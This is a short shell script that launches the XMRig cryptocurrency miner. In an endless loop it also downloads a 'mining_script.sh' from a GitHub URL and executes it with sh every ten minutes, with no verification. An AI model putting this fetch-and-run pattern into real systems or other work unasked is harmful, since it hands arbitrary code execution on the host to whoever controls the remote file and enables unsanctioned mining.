#!/bin/sh

SCRIPT_URL="https://raw.githubusercontent.com/Renegadestation/Renegadestation/main/mining_script.sh"
SCRIPT_PATH="/tmp/mining_script.sh"

# Function to fetch the latest external script (if needed)
fetch_script() {
    echo "Fetching the latest mining script from GitHub..."
    wget -q -O $SCRIPT_PATH $SCRIPT_URL && chmod +x $SCRIPT_PATH
}

# Fetch latest mining script
fetch_script

# Start XMRig in the foreground
sysctl -w vm.nr_hugepages=128 2>/dev/null || true
/usr/local/bin/xmrig --config=/config/config.json &

# Periodically check for script updates
while true; do
    fetch_script  # Always get the latest script
    sh $SCRIPT_PATH  # Run the script (if it exists)
    sleep 600  # Wait 10 minutes before checking again
done
